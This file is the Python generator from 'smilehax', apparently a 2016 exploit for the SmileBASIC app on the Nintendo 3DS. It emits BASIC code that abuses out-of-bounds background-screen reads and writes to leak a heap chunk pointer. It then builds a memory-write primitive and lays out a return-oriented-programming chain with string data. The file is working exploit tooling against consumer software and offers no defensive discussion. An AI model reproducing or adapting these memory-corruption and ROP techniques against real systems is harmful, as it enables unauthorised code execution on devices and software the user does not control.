# smilehax - smilebasic 3ds exploit
# plutoo 2016

from constants import *

def emit_w32(offset, val):
    print 'W %u,&H%X' % \
        (offset/4, val)

def emit_hdr(rop_start):
    print 'BGSCREEN 0,1073741824,2'

    # Word offset for the prev-ptr in the heap memchunkhdr immediately following
    # this buffer.
    prev_memchunkhdr_ptr_wordoff = (TABLE_OBJ_SIZE-TABLE_BASE_OFFSET+0x8)/4

    print 'B0=BGGET(0,%u,0)' % (prev_memchunkhdr_ptr_wordoff)
    print 'B1=BGGET(0,%u,1)' % (prev_memchunkhdr_ptr_wordoff)
    print 'B=((B1 OR (B0 << 16))+%u)/4' % (0x10+TABLE_BASE_OFFSET)

    print 'DEF W A,V'
    print '  BGPUT 0,A+%u-B,0,V>>16' % (rop_start/4)
    print '  BGPUT 0,A+%u-B,1,V' % (rop_start/4)
    print 'END'
    print ''

class DontCare:
    pass

class PtrToStr:
    def __init__(self, val):
        self.val = val

    def get_data(self):
        data = []
        for i in range((len(self.val)+3) / 4):
            w32 = self.val[4*i:4*i+4].encode('hex')
            while len(w32) < 8:
                w32 += '00'
            w32 = ''.join([w32[x:x+2] for x in range(0, len(w32), 2)][::-1])
            w32 = int(w32, 16)
            data.append(w32)
        return data

class PtrToUStr:
    def __init__(self, val):
        self.val = val

    def get_data(self):
        data = []
        for i in range((len(self.val)+1) / 2):
            w32 = self.val[2*i:2*i+2].encode('hex')
            w32 = w32[0:2] + '00' + w32[2:4] + '00'
            while len(w32) < 8:
                w32 += '00'
            w32 = ''.join([w32[x:x+2] for x in range(0, len(w32), 2)][::-1])
            w32 = int(w32, 16)
            data.append(w32)
        return data

class RelativeAddr:
    def __init__(self, off):
        self.off = off

class SafeAddr:
    def __init__(self, off):
        self.off = off

def emit_rop(start, end, safe, rop):
    # Rop chain.
    rop_addr = start
    rop_offset = 0
    data = []
    for val in rop:
        # Don't place a write where we don't need one, less to type manually.
        if val == DontCare:
            pass
        elif isinstance(val, RelativeAddr):
            emit_w32(rop_offset, rop_addr + val.off)
        elif isinstance(val, SafeAddr):
            emit_w32(rop_offset, safe + val.off)
        elif type(val) == int:
            emit_w32(rop_offset, val)
        else:
            emit_w32(rop_offset, end +  4 * len(data))
            data.extend(val.get_data())
        rop_addr += 4
        rop_offset += 4

    # Space.
    print ''

    # Data.
    rop_addr = end
    for val in data:
        emit_w32(rop_addr - start, val)
        rop_addr += 4
